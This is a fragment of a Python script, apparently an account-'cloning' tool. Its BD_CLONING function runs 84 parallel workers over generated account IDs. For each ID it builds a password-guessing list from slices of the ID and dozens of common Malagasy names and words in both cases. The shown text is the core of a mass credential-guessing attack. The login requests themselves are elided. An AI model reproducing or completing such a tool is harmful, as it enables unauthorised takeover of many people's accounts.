...
def BD_CLONING():
    ...
    with tred(max_workers=84) as Dipto:
        ...
        for psx in user:
            ids=code+psx
            passlist=[psx,ids,ids[:6],ids[:6],ids[5:],'nekena','Nekena','fitiavana','Fitiavana','nirina','Nirina','fanantenana','Fanantenana','mamako','Mamako','anjara','Anjara','malala','Malala','safidy','Safidy','vadiko','Vadiko','mahefa','Mahefa','randria','Randria','miangaly','Miangaly','miangola','Miangola','faneva','Faneva','solofo','Solofo','mahery','Mahery','ravaka','Ravaka','sarindra','narindra','fanomezana','fiderana','Fiderana','fandresena','Fandresena','nantenaina','Nantenaina','Rakotomalala','rakotomalala','fahendrena','Fahendrena','finoana','Finoana','amboara','Amboara','nomena','Nomena','Fanomezana','faneva','Faneva','valisoa','Valisoa','malalako','Malalako','narovana','Narovana','mamiko','Mamiko','tantely','Tantely','tolotra','Tolotra','fifaliana','Fifaliana','milely','Milely','malagasy','Malagasy','tsilavina','Tsilavina','maminirina','Maminirina','diamondra','Diamondra','mandresy','Mandresy',]
